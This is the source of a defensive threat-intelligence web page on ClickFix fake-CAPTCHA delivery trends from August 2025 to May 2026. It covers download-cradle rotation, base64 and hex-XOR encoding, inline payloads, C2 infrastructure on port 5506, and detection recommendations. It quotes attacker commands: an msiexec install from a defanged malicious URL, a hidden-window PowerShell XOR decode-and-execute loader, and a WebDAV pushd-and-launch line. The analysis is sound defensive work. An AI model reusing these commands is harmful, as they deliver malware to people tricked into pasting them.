---
layout: default
title: "ClickFix Delivery Chain: Trend Analysis"
description: "ClickFix delivery-chain trends through the Detection Chokepoint Framework. Behavioural classification from Carson ClickFix Hunter (per-domain clipboard commands) with MHaggis ClickGrab crawl volume. Tracks cradle family rotation, encoding obfuscation, and the inline-payload shift, Aug 2025 – May 2026."
permalink: /trends/clickgrab/
---

<style>
/* ── Page layout ────────────────────────────────────────────────────────── */
.cg-page { }
.cg-page h1 { font-size: 1.6rem; font-weight: 700; margin-bottom: .25rem; } /* color: theme-arcade.css accent */
.cg-page h2 { font-size: 1.15rem; font-weight: 700; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid transparent; border-image: linear-gradient(to right, var(--accent), var(--border) 35%, transparent) 1; padding-bottom: .4rem; }
.cg-page h3 { font-size: 1rem; font-weight: 600; color: var(--text); margin: 1.5rem 0 .5rem; }
.cg-page p, .cg-page li { color: var(--text-muted); font-size: .9rem; line-height: 1.7; }
.cg-page a { color: var(--link); }
.cg-meta { color: var(--text-muted); font-size: .8rem; margin-bottom: 1.75rem; }

/* ── Stats row ──────────────────────────────────────────────────────────── */
.cg-stats { display: flex; gap: 1rem; flex-wrap: wrap; margin: 1.25rem 0 2rem; }
.cg-stat  { flex: 1 1 140px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: .85rem 1rem; box-shadow: 0 4px 16px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.04); }
.cg-stat-val { font-size: 1.85rem; font-weight: 700; color: var(--text); font-family: ui-monospace, monospace; line-height: 1.2; }
.cg-stat-lbl { font-size: .72rem; color: var(--text-muted); margin-top: .2rem; text-transform: uppercase; letter-spacing: .04em; }

/* ── Framework chain map ────────────────────────────────────────────────── */
.cg-chain { display: flex; align-items: flex-start; gap: 0; flex-wrap: wrap; margin: 1.5rem 0 2rem; }
.cg-chain-stage {
  flex: 1 1 90px; min-width: 80px;
  border: 1px solid var(--border); border-radius: 6px;
  padding: .6rem .5rem; text-align: center; background: var(--bg-card);
  position: relative;
}
.cg-chain-stage + .cg-chain-stage { margin-left: -1px; border-radius: 0; }
.cg-chain-stage:first-child { border-radius: 6px 0 0 6px; }
.cg-chain-stage:last-child  { border-radius: 0 6px 6px 0; }
.cg-chain-stage--blind  { border-top: 3px solid var(--border); }
.cg-chain-stage--t1     { border-top: 3px solid var(--high);     box-shadow: inset 0 3px 10px -5px rgba(227,179,65,0.4); }
.cg-chain-stage--t2     { border-top: 3px solid var(--accent);   box-shadow: inset 0 3px 10px -5px rgba(240,136,62,0.4); }
.cg-chain-stage--t3     { border-top: 3px solid var(--critical); box-shadow: inset 0 3px 10px -5px rgba(218,54,51,0.4); }
.cg-chain-label { font-size: .72rem; font-weight: 600; color: var(--text); line-height: 1.3; display: block; }
.cg-chain-sub   { font-size: .62rem; color: var(--text-muted); margin-top: .25rem; display: block; }
.cg-tier-badge  { display: inline-block; font-size: .6rem; font-weight: 700; padding: .1rem .35rem; border-radius: 3px; margin-top: .35rem; letter-spacing: .03em; }
.cg-tier-blind  { background: var(--bg-input); color: var(--text-muted); }
.cg-tier-t1     { background: rgba(227,179,65,.15);  color: var(--high); }
.cg-tier-t2     { background: rgba(240,136,62,.15);  color: var(--accent); }
.cg-tier-t3     { background: rgba(218,54,51,.15);   color: var(--critical); }
.cg-chain-arrow {
  align-self: center; flex: 0 0 auto;
  color: var(--border); font-size: 1.2rem; padding: 0 .1rem; margin-top: -2px;
}

/* ── Chart containers ───────────────────────────────────────────────────── */
.cg-chart-wrap { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1rem .5rem; margin: 1rem 0 1.75rem; overflow-x: auto; }
.cg-chart-title { font-size: .75rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: .05em; margin-bottom: .5rem; }

/* ── Callout boxes ──────────────────────────────────────────────────────── */
.cg-callout { border-radius: 6px; padding: .85rem 1rem; margin: .75rem 0; font-size: .875rem; border-left: 3px solid; }
.cg-callout--warn  { background: rgba(227,179,65,.08);  border-color: var(--high);     color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(227,179,65,0.35); }
.cg-callout--alert { background: rgba(218,54,51,.08);   border-color: var(--critical); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(218,54,51,0.35); }
.cg-callout--info  { background: rgba(56,139,253,.08);  border-color: var(--low);      color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(56,139,253,0.35); }
.cg-callout--tip   { background: rgba(63,185,80,.08);   border-color: var(--medium);   color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(63,185,80,0.35); }
.cg-callout strong { color: var(--text); }

/* ── Staging domain table ───────────────────────────────────────────────── */
.cg-table { width: 100%; border-collapse: collapse; font-size: .85rem; margin: .75rem 0 1.5rem; }
.cg-table th { text-align: left; color: var(--text-muted); font-size: .72rem; text-transform: uppercase; letter-spacing: .04em; border-bottom: 1px solid var(--border); padding: .4rem .6rem; font-weight: 600; }
.cg-table td { padding: .45rem .6rem; border-bottom: 1px solid var(--border); color: var(--text); font-family: ui-monospace, monospace; font-size: .82rem; transition: background .1s; }
.cg-table tr:hover td { background: rgba(255,255,255,0.02); }
.cg-table tr:last-child td { border-bottom: none; }
.cg-badge-cdn  { display: inline-block; background: rgba(227,179,65,.15); color: var(--high);     font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
.cg-badge-ip   { display: inline-block; background: rgba(240,136,62,.15); color: var(--accent);  font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
.cg-badge-bp   { display: inline-block; background: rgba(218,54,51,.15);  color: var(--critical); font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }
.cg-badge-comp { display: inline-block; background: rgba(139,92,246,.15); color: #8b5cf6;         font-size: .65rem; font-weight: 700; padding: .1rem .3rem; border-radius: 3px; letter-spacing: .03em; }

/* ── Recommendation list ────────────────────────────────────────────────── */
.cg-rec { display: flex; gap: .75rem; align-items: flex-start; padding: .6rem 0; border-bottom: 1px solid var(--border); }
.cg-rec:last-child { border-bottom: none; }
.cg-rec-tier { flex: 0 0 62px; }
.cg-rec-body { flex: 1; font-size: .875rem; color: var(--text-muted); }
.cg-rec-body strong { color: var(--text); display: block; margin-bottom: .2rem; }
.cg-rec-examples { margin-top: .5rem; }
.cg-rec-examples-toggle {
  background: none; border: none; cursor: pointer; padding: 0;
  display: flex; align-items: center; gap: .3rem;
  color: var(--text-dim); font-size: .78rem; font-family: inherit;
}
.cg-rec-examples-toggle:hover { color: var(--text-muted); }

/* ── Sidebar + layout (local override to survive Tailwind preflight) ── */
.trends-layout {
  display: flex;
  gap: 2rem;
  max-width: 1100px;
  margin: 0 auto;
  padding: 2rem 1.5rem 4rem;
}
.trends-sidebar {
  width: 160px;
  flex-shrink: 0;
  position: sticky;
  top: 5rem;
  align-self: flex-start;
  height: fit-content;
  padding: 1rem 0;
}
.trends-sidebar ul { list-style: none; padding: 0; margin: 0; }
.trends-sidebar li { margin: 0; }
.trends-sidebar a {
  display: block;
  font-family: var(--font-mono, ui-monospace, monospace);
  font-size: .73rem;
  color: var(--text-dim, #484f58);
  padding: .35rem .75rem;
  text-decoration: none;
  border-left: 2px solid transparent;
  border-radius: 0 3px 3px 0;
  transition: color .15s, border-color .15s, background .15s;
}
.trends-sidebar a:hover {
  color: var(--text-muted);
  text-decoration: none;
  background: rgba(255,255,255,0.025);
}
.trends-sidebar a.active {
  color: var(--text, #c9d1d9);
  font-weight: 500;
  border-left: 3px solid var(--accent, #f0883e);
  box-shadow: inset 3px 0 8px -4px rgba(240,136,62,0.4);
  background: rgba(240,136,62,0.07);
}
.trends-content {
  flex: 1;
  min-width: 0;
}

@media (max-width: 900px) {
  .trends-layout { flex-direction: column; padding: 2rem 1rem 4rem; }
  .trends-sidebar {
    position: fixed; bottom: 0; left: 0; right: 0;
    width: 100%; top: auto; align-self: auto;
    background: rgba(13,17,23,0.92); backdrop-filter: blur(8px);
    border-top: 1px solid var(--border); padding: .5rem 0; z-index: 100;
  }
  .trends-sidebar ul { display: flex; gap: 0; justify-content: space-around; width: 100%; }
  .trends-sidebar a {
    border-left: none; border-bottom: 2px solid transparent;
    padding: .3rem .5rem; font-size: .6rem; text-align: center;
  }
  .trends-sidebar a.active { border-bottom-color: var(--accent); border-left-color: transparent; }
  .trends-content { padding-bottom: 3.5rem; }
}

/* ── Detection rec cards (matches edge exploits page) ── */
.det-rec {
  background: var(--bg-card); border: 1px solid var(--border);
  border-radius: 6px; margin: 1rem 0; overflow: hidden;
}
.det-rec-header {
  display: flex; align-items: flex-start; gap: 0.8rem;
  padding: 1rem 1.2rem;
}
.det-rec-tier {
  font-family: var(--font-mono); font-size: 0.65rem;
  font-weight: 700; letter-spacing: 0.08em;
  padding: 3px 10px; border-radius: 3px;
  white-space: nowrap; margin-top: 2px; flex-shrink: 0;
}
.det-rec-title { font-weight: 600; color: var(--text); font-size: 0.92rem; line-height: 1.4; }
.det-rec-desc { color: var(--text-muted); font-size: 0.85rem; margin-top: 0.3rem; line-height: 1.5; }
.det-rec details { padding: 0 1.2rem; margin: 0; }
.det-rec details[open] { padding-bottom: 1rem; }
.det-rec summary {
  font-family: var(--font-mono); font-size: 0.75rem;
  color: var(--text-muted); cursor: pointer; margin: 0; padding: 0.5rem 0;
  list-style: none; display: flex; align-items: center; gap: 0.4rem;
}
.det-rec summary::-webkit-details-marker { display: none; }
.det-rec summary::before { content: "›"; color: var(--text-dim); transition: transform .15s; }
details[open] > summary::before { transform: rotate(90deg); }
details[open] > summary { margin-bottom: 0.4rem; }
.tier-1  { background: rgba(218,54,51,0.15);  color: var(--critical); }
.tier-2  { background: rgba(240,136,62,0.15);  color: var(--accent); }
.tier-na { background: rgba(107,114,128,0.15); color: var(--text-muted); }
</style>

<div class="trends-layout">
<nav class="trends-sidebar" id="trends-nav">
  <ul>
    <li><a href="#overview" class="active">Overview</a></li>
    <li><a href="#framework">Framework</a></li>
    <li><a href="#volume">Volume</a></li>
    <li><a href="#cradles">Cradles</a></li>
    <li><a href="#evasion">Evasion</a></li>
    <li><a href="#msiexec">MSIExec</a></li>
    <li><a href="#inline">Inline</a></li>
    <li><a href="#staging">Staging</a></li>
    <li><a href="#recommendations">Detections</a></li>
  </ul>
</nav>
<div class="cg-page trends-content" id="overview">

<h1>ClickFix Delivery Chain: Trend Analysis</h1>
<p class="cg-meta">
  Data: <a href="https://github.com/mhaggis/ClickGrab" target="_blank" rel="noopener">MHaggis ClickGrab</a> + <a href="https://clickfix.carsonww.com/" target="_blank" rel="noopener">ClickFix Hunter</a>
  &nbsp;·&nbsp; Period: Aug 2025 – May 2026
  &nbsp;·&nbsp; {{ site.data.clickgrab_trends.meta.total_reports }} nightly reports + {{ site.data.clickgrab_trends.meta.total_domains }} domains
  &nbsp;·&nbsp; Generated: {{ site.data.clickgrab_trends.meta.generated }}
</p>

<!-- ── Dataset Overview ──────────────────────────────────────────────── -->
<!-- Behavioural cards use the CLEAN per-domain command classification (Carson ClickFix
     Hunter); only "Sites crawled" is MHaggis site-crawl volume. See DECISIONS #012. -->
<div class="cg-stats">
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.meta.total_domains }}</div>
    <div class="cg-stat-lbl">ClickFix domains</div>
  </div>
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.meta.total_sites_crawled | divided_by: 1000 }}k+</div>
    <div class="cg-stat-lbl">Sites crawled</div>
  </div>
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.domain_cradles_total.msiexec }}</div>
    <div class="cg-stat-lbl">MSIExec deliveries</div>
  </div>
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.domain_evasion_totals.no_url }}</div>
    <div class="cg-stat-lbl">Inline payloads (no URL)</div>
  </div>
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.domain_evasion_totals.base64 }}</div>
    <div class="cg-stat-lbl">Base64 encoded</div>
  </div>
  <div class="cg-stat">
    <div class="cg-stat-val">{{ site.data.clickgrab_trends.domain_evasion_totals.hex_xor }}</div>
    <div class="cg-stat-lbl">Hex-XOR payloads</div>
  </div>
</div>

<!-- ── Framework Chain Map ───────────────────────────────────────────── -->
<h2 id="framework">Detection Chokepoint Framework</h2>
<p>Every ClickFix variant (ClickFix, FileFix, TerminalFix, InstallFix) follows these five stages. The lure changes. The clipboard command changes. The delivery method changes. But the chain doesn't. Each badge maps to the ATT&CK technique you're actually detecting at that stage.</p>

<div class="cg-chain" role="list" aria-label="ClickFix delivery chain stages">
  <div class="cg-chain-stage cg-chain-stage--blind" role="listitem">
    <span class="cg-chain-label">Browser renders lure</span>
    <span class="cg-chain-sub">Fake CAPTCHA / reCAPTCHA page</span>
    <span class="cg-tier-badge cg-tier-blind">LURE DELIVERY</span>
  </div>
  <span class="cg-chain-arrow" aria-hidden="true">›</span>
  <div class="cg-chain-stage cg-chain-stage--blind" role="listitem">
    <span class="cg-chain-label">JS → clipboard</span>
    <span class="cg-chain-sub">execCommand("copy") writes cmd</span>
    <span class="cg-tier-badge cg-tier-blind">CLIPBOARD WRITE</span>
  </div>
  <span class="cg-chain-arrow" aria-hidden="true">›</span>
  <div class="cg-chain-stage cg-chain-stage--t1" role="listitem">
    <span class="cg-chain-label">Process spawn</span>
    <span class="cg-chain-sub">Run dialog → cmd.exe → PowerShell</span>
    <span class="cg-tier-badge cg-tier-t1">T1059 EXECUTION</span>
  </div>
  <span class="cg-chain-arrow" aria-hidden="true">›</span>
  <div class="cg-chain-stage cg-chain-stage--t1" role="listitem">
    <span class="cg-chain-label">Network fetch</span>
    <span class="cg-chain-sub">IWR / IRM / WebClient / Curl</span>
    <span class="cg-tier-badge cg-tier-t1">T1105 INGRESS TOOL</span>
  </div>
  <span class="cg-chain-arrow" aria-hidden="true">›</span>
  <div class="cg-chain-stage cg-chain-stage--t2" role="listitem">
    <span class="cg-chain-label">Payload write</span>
    <span class="cg-chain-sub">Script dropped to %TEMP%</span>
    <span class="cg-tier-badge cg-tier-t2">T1204 USER EXEC</span>
  </div>
  <span class="cg-chain-arrow" aria-hidden="true">›</span>
  <div class="cg-chain-stage cg-chain-stage--t3" role="listitem">
    <span class="cg-chain-label">Execute + cleanup</span>
    <span class="cg-chain-sub">Payload runs, then self-deletes</span>
    <span class="cg-tier-badge cg-tier-t3">T1070 CLEANUP</span>
  </div>
</div>

<p>Two behaviors survive every variant rotation: the process spawn (T1059) and the network fetch (T1105). The user opens Run, pastes, hits Enter. That parent→child process relationship is baked into the attack primitive. And until recently, every cradle had to reach out to a staging URL to pull the payload. That's where your detection bets pay off. We'll get to why "until recently" matters below. Full detection logic is on the <a href="{{ '/chokepoints/clickfix-techniques/' | relative_url }}">ClickFix Techniques chokepoint page</a>.</p>

<!-- ── Chart A: Monthly Volume ───────────────────────────────────────── -->
<h2 id="volume">Monthly Volume: Malicious Domain Count</h2>
<p>Unique malicious ClickFix domains observed per month from the domain dataset. Volume spikes correlate with specific campaigns. The Nov 2025 surge was driven by the <code>shift-art[.]com</code> MSIExec campaign (669 domains).</p>

<div class="cg-chart-wrap">
  <div class="cg-chart-title">Malicious ClickFix domains by month</div>
  <div id="cg-chart-volume"></div>
</div>

<div class="cg-callout cg-callout--alert">
  <strong>May 2026: 92.4% of domains now carry inline payloads.</strong> Up from 65% in April and 40% in March, the no-URL rate has hit a new high. Base64 accounts for 67% of May domains (354/528). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update - no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
</div>

<!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
<h2 id="cradles">T1105 Ingress Tool Transfer: Cradle Family Evolution</h2>
<p>The network fetch <em>was</em> the unavoidable action. This chart shows how adversaries rotated their download method as defenders tuned IWR/IEX-specific detections, and why that rotation actually validates the chokepoint approach.</p>

<div class="cg-chart-wrap">
  <div class="cg-chart-title">Monthly cradle family distribution (PowerShell download method)</div>
  <div id="cg-chart-cradles"></div>
</div>

<div class="cg-callout cg-callout--warn">
  <strong>Dec 2025 pivot: your IWR detections worked.</strong> IWR/IEX drops sharply as WebClient and Curl surge in the same month. That's not coincidence. That's adversaries responding to detection pressure. If you were pattern-matching on <code>iwr|Invoke-WebRequest</code>, congratulations: you forced a rotation. But if that's <em>all</em> you were matching, your coverage just dropped to near-zero.
</div>

<div class="cg-callout cg-callout--alert">
  <strong>Mar 2026: IWR came back.</strong> After nearly disappearing in Dec–Jan, IWR surged to 27.7% in March. A <code>verifyhumanbot[.]com</code> / <code>SafeAntiBotsNet</code> campaign brought it right back. This is the whole point: cradle rotation is cyclical, not one-directional. The adversary who abandoned IWR in December picked it back up in March because defensive attention had shifted elsewhere. If you built behavioral rules (unusual parent → PowerShell → outbound fetch), you caught it both times. If you built string-match rules, you caught it, lost it, and caught it again, assuming you didn't delete the "obsolete" detection.
</div>

<div class="cg-callout cg-callout--info">
  <strong>The chokepoint didn't move.</strong> IWR → WebClient → Curl → IWR again. The download method rotated three times in six months. The detection signal didn't change once: PowerShell process spawned by an unusual parent (explorer.exe, cmd.exe from Run dialog) making an outbound HTTP connection. That's the difference between detecting the tool and detecting the behavior.
</div>

<!-- ── Chart C: Evasion Technique Trends ─────────────────────────────── -->
<h2 id="evasion">Evasion Technique Trends: Where Adversaries Are Adapting</h2>
<p>Think of this chart as a conversation between attackers and defenders. Rising lines = defenders forced a change. Flat lines with spikes = a specific campaign tried something, then moved on. The trends tell you which evasion techniques are gaining traction and which were one-off experiments.</p>

<div class="cg-chart-wrap">
  <div class="cg-chart-title">Monthly evasion technique prevalence (count of sites using each technique)</div>
  <div id="cg-chart-evasion"></div>
</div>

<div class="cg-callout cg-callout--warn">
  <strong>Self-delete was a burst, not a trend.</strong> 27.4% in Dec → 2.3% Jan → 0% by April. One campaign tried it, others didn't pick it up. It's in the toolkit but it's not the future. If you built file-write-then-delete correlation rules in December, keep them, but the bigger threat is below.
</div>

<div class="cg-callout cg-callout--warn">
  <strong>The May base64 spike was one campaign, not a re-tooling.</strong> Hex-XOR (<code>-bxor</code>) is the persistent inline encoder of spring 2026: absent before March, then 16% of March domains, <strong>54% in April</strong> (97/181), 22% in May, and back to <strong>84% in June</strong> (62/74). Base64 stayed in the single digits (9% March, 8% April) until May, when it spiked to <strong>67%</strong> (354/528) almost entirely on one token (<code>frombase64string</code>, 352 of 354) before collapsing to 1% in June. The two encoders barely overlap (2 of May's 354 base64 domains also use hex-XOR), so this reads as a single base64 campaign cluster passing through, not a durable shift. Either way, if your rules match plaintext <code>iwr https://</code> strings you're seeing the encoded version now, not the decoded cradle. Detect the encoding act, not the encoder: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>, the <code>-bxor</code> decode loop, or <code>-enc</code> from an unusual parent. The content is opaque; the execution context isn't.
</div>

<div class="cg-callout cg-callout--warn">
  <strong>Mixed-case is dead.</strong> POWerShEll, PowErsHeLL: peaked mid-2025, trending to zero. Base64 replaced it as the primary obfuscation. If you shipped case-insensitive regex in 2025, you caught the tail end of a dying technique. Not wasted effort, but not where the action is anymore.
</div>

<!-- ── MSIExec Delivery ─────────────────────────────────────────── -->
<h2 id="msiexec">New Cradle Family: MSIExec Package Installation</h2>
<p>In November 2025, the ClickFix chokepoint shifted underneath the detection layer. 87% of domains rotated from PowerShell cradles to <code>msiexec /i</code>. Same social engineering invariant, completely different execution chain. MSIExec delivery peaked at 669/767 domains before declining through Q1 2026. The technique shift demonstrates why chokepoint-anchored detection matters: PowerShell-specific rules missed the rotation entirely, but detections built around the clipboard-to-execution invariant still caught the handoff.</p>

<p>The <code>shift-art[.]com</code> campaign drove the surge: 651 domains using fake Cloudflare verification paths. The URL structure alone is worth a detection:</p>

<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>msiexec /i hxxps[://]shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>

<div class="cg-callout cg-callout--alert">
  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL. That's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2%.
</div>

<h3>WScript/VBS: A Failed Diversification (Dec 2025 – Feb 2026)</h3>
<p>Adversaries also tried VBS in the same diversification window. Dec 2025 (21.9%), peaked Jan (46.3%), dead by March (0%). Used <code>CreateObject("WinHttp.WinHttpRequest.5.1")</code> to fetch payloads via WScript. Abandoned fast. EDR catches WScript execution reliably, so this branch got pruned while WebClient and Curl survived. Not every experiment sticks.</p>

<!-- ── Inline Payloads ─────────────────────────────────────────── -->
<h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
<p>Here's the finding that changes the detection calculus: <strong>92% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>

<p>Base64 accounted for 67% of May domains (354/528), but that was a single-campaign spike (see above) - by June it collapsed to 1% while <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 65 instances in March) climbed back to 84%. A newer <strong>WebDAV delivery</strong> variant also appears, using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>

<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
$b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
iex([Text.Encoding]::UTF8.GetString($b))</code></pre>

<div class="cg-callout cg-callout--alert">
  <strong>Your network-fetch detection covers 8% of the threat now.</strong> 92% of May 2026 domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both. And if you're not alerting on <code>conhost --headless</code> spawning <code>cmd.exe</code> with a UNC path argument, you have a blind spot for the WebDAV variant entirely.
</div>

<p>Monthly no-URL trend: Aug 28% → Sep 29% → Oct 32% → Nov 5% → Dec 7% → Jan 16% → Feb 6% → Mar 40% → Apr 65% → May 92% → <strong>Jun 88%</strong>.</p>

<h3>Port 5506 C2 Infrastructure Cluster</h3>
<p>333 domains call back to port 5506 across 14 IPs in a few /24 ranges. One operator, one port, zero legitimate services using 5506. This is the kind of infrastructure fingerprint that makes network detection easy.</p>

<div class="cg-callout cg-callout--info">
  <strong>Any outbound connection to port 5506 from a workstation is suspicious.</strong> Port 5506 is not used by any common legitimate service. Top nodes: <code>198[.]13[.]158[.]127:5506</code> (186 domains), <code>178[.]17[.]59[.]40:5506</code> (64), <code>78[.]40[.]209[.]164:5506</code> (40).
</div>

<!-- ── Staging Infrastructure ────────────────────────────────────────── -->
<h2 id="staging">Staging Infrastructure</h2>
<p>Where the payloads actually live. CDN-hosted staging defeats domain-reputation blocking because the infrastructure <em>is</em> legitimate web hosting. You can't blocklist <code>raw.githubusercontent.com</code> without breaking your developers' workflows. Detection has to be contextual. A network appliance fetching a shell script from GitHub and piping it to bash is anomalous regardless of the domain.</p>

<div style="overflow-x:auto;">
<table class="cg-table">
  <thead>
    <tr>
      <th></th>
      <th>Domain / IP</th>
      <th>Payloads</th>
      <th>Type</th>
      <th>Blind spot</th>
    </tr>
  </thead>
  <tbody>
    {% for d in site.data.clickgrab_trends.staging_domains %}
    <tr class="cg-infra-row">
      <td style="padding:.45rem .25rem .45rem .4rem;width:1.2rem;">
        <button class="cg-infra-toggle" aria-expanded="false"
                data-target="infra-detail-{{ forloop.index }}"
                aria-label="Show details for {{ d.domain }}">
          <span class="collapsible-chevron">›</span>
        </button>
      </td>
      <td><code style="font-size:.8rem;">{{ d.domain }}</code></td>
      <td>{{ d.count }}</td>
      <td>
        {% if d.cdn %}<span class="cg-badge-cdn">CDN</span>
        {% elsif d.is_ip %}<span class="cg-badge-ip">IP</span>
        {% elsif d.hosting_type == "bulletproof" %}<span class="cg-badge-bp">BP</span>
        {% elsif d.hosting_type == "compromised" %}<span class="cg-badge-comp">COMP</span>
        {% elsif d.hosting_type == "managed" %}<span class="cg-badge-cdn">MGD</span>
        {% else %}-{% endif %}
      </td>
      <td style="color:var(--text-muted);font-family:inherit;font-size:.8rem;">
        {% if d.cdn %}Domain reputation blocklists ineffective (legitimate CDN provider)
        {% elsif d.hosting_type == "bulletproof" %}Abuse-tolerant VPS - takedown requests ignored; block by ASN or IP range
        {% elsif d.hosting_type == "compromised" %}Legitimate site used as payload host - blocking harms the victim domain
        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting - blocklist removes legitimate sites
        {% elsif d.domain contains "blogspot.com" or d.domain contains "blogger.com" %}Google-hosted; domain blocking would block all of Blogger
        {% else %}-{% endif %}
      </td>
    </tr>
    <tr id="infra-detail-{{ forloop.index }}" class="cg-infra-detail-row">
      <td colspan="5" style="padding:0;">
        <div class="cg-infra-detail-body">
          {% if d.asn %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">ASN</span>
            <span class="cg-infra-field-val">{{ d.asn }}</span>
          </div>
          {% endif %}
          {% if d.country %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">Country{% if d.city %} / City{% endif %}</span>
            <span class="cg-infra-field-val">{{ d.country }}{% if d.city %} · {{ d.city }}{% endif %}</span>
          </div>
          {% endif %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">Hosting</span>
            <span class="cg-infra-field-val">
              {% if d.hosting_type == "cdn" %}<span class="cg-badge-hosting-cdn">CDN</span> Legitimate content delivery network
              {% elsif d.hosting_type == "managed" %}<span class="cg-badge-hosting-mgd">Managed</span> Managed hosting (likely compromised)
              {% elsif d.hosting_type == "bulletproof" %}<span class="cg-badge-hosting-bp">Bulletproof</span> Abuse-tolerant VPS / dedicated hosting
              {% elsif d.hosting_type == "compromised" %}<span class="cg-badge-hosting-comp">Compromised</span> Legitimate site abused as staging host
              {% else %}<span class="cg-badge-hosting-unk">Unknown</span>{% endif %}
            </span>
          </div>
          {% unless d.is_ip %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">Registered</span>
            <span class="cg-infra-field-val">{% if d.created %}{{ d.created }}{% else %}-{% endif %}</span>
          </div>
          {% if d.registrar %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">Registrar</span>
            <span class="cg-infra-field-val">{{ d.registrar }}</span>
          </div>
          {% endif %}
          {% endunless %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">Status</span>
            <span class="cg-infra-field-val">
              {% if d.status == "active" %}<span class="cg-badge-status-active">Active</span>
              {% elsif d.status == "taken_down" %}<span class="cg-badge-status-down">Taken down</span>
              {% else %}<span class="cg-badge-status-unknown">Unknown</span>{% endif %}
            </span>
          </div>
          {% if d.dns_history_url %}
          <div class="cg-infra-field">
            <span class="cg-infra-field-label">DNS history</span>
            <span class="cg-infra-field-val"><a href="{{ d.dns_history_url }}" target="_blank" rel="noopener">SecurityTrails →</a></span>
          </div>
          {% endif %}
        </div>
      </td>
    </tr>
    {% endfor %}
  </tbody>
</table>
</div>

<p style="font-size:.75rem;color:var(--text-dim);margin:.25rem 0 .75rem;">Domain names and observation counts are from ClickGrab nightly reports. Hosting type is only classified when verifiable from the domain itself (e.g., <code>*.cdn-website.com</code> = CDN, <code>*.wpengine.com</code> = managed hosting). IP enrichment (ASN, geo, registrar) requires running the enrichment pipeline. Unverified entries show "Unknown."</p>

<div class="cg-callout cg-callout--alert">
  <strong>CDN-hosted staging defeats domain blocking.</strong> <code>irp.cdn-website.com</code> appeared in {{ site.data.clickgrab_trends.staging_domains.first.count }} payload fetches. This is a legitimate CDN used by website builders. Blocking it would impact legitimate sites. Detection must shift to behavioral signals (PowerShell → network → unusual domain path) rather than domain-reputation lookup.
</div>

<!-- ── Detection Recommendations ────────────────────────────────────── -->
<h2 id="recommendations">Detection Recommendations</h2>
<p>Each recommendation maps to the ATT&CK technique it detects. The ones at the top survived every cradle rotation, every obfuscation pivot, and every infrastructure change in this dataset. The ones lower down are still valuable but more brittle.</p>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1059</span>
    <div>
      <div class="det-rec-title">Detect unusual parent → PowerShell spawn</div>
      <div class="det-rec-desc">Correlate <code>explorer.exe</code> or <code>cmd.exe</code> (from Run dialog) spawning <code>powershell.exe</code> with a window-hidden flag. This signal is constant regardless of cradle family rotation. See <a href="https://github.com/{{ site.github_username }}/{{ site.github_repo }}/blob/main/sigma-rules/clickfix/hunt.yml" target="_blank" rel="noopener">sigma-rules/clickfix/hunt.yml</a>.</div>
    </div>
  </div>
  {% if site.data.clickgrab_trends.payload_examples.hidden_window.size > 0 %}
  <details>
